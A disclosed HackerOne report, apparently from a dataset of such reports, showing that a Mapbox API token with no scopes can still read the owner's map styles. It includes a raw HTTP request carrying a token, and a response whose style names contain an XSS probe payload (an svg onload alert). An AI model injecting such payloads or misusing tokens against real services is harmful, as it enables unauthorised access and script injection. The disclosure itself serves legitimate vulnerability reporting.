---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '122050'
original_report_id: '122050'
title: Mapbox API Access Token with No Scope Can Read Styles
weakness: Improper Authentication - Generic
team_handle: mapbox
created_at: '2016-03-10T14:09:16.649Z'
disclosed_at: '2016-05-31T22:03:00.657Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- improper-authentication-generic
---

# Mapbox API Access Token with No Scope Can Read Styles

## Metadata

- HackerOne Report ID: 122050
- Weakness: Improper Authentication - Generic
- Program: mapbox
- Disclosed At: 2016-05-31T22:03:00.657Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

HI 
I created one api token with 0 scope.
Then I sent the following request to server

GET /styles/v1/katilthe?access_token=pk.eyJ1Ijoia2F0aWx0aGUiLCJhIjoiY2lsbWJwcWpjNjhmNnZubWNhYXdwZm5obyJ9.2cPnaIiXcFnDRFMfrD1TRw HTTP/1.1
Host: api.mapbox.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://www.mapbox.com/studio/styles/fonts/
Origin: https://www.mapbox.com
Connection: keep-alive

I Got 200 OK in response and my styles.

[{"version":8,"name":"test\"><svg/onload=alert(2)>-copy-copy","center":[-78.90145050000001,33.70101199999998],"zoom":12,"bearing":0,"pitch":0,"created":"2016-03-10T13:45:51.193Z","id":"cilmbusls00cvc6m23qpi69gg","modified":"2016-03-10T13:45:51.193Z","owner":"katilthe"},{"version":8,"name":"test\"><svg/onload=alert(2)>-copy","center":[0,-1.1368683772161603e-13],"zoom":0.3106126682923422,"bearing":0,"pitch":0,"created":"2016-03-10T13:43:58.005Z","id":"cilmbsd9s00cfc7mcl1m7nnrz","modified":"2016-03-10T13:43:58.005Z","owner":"katilthe"}]

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
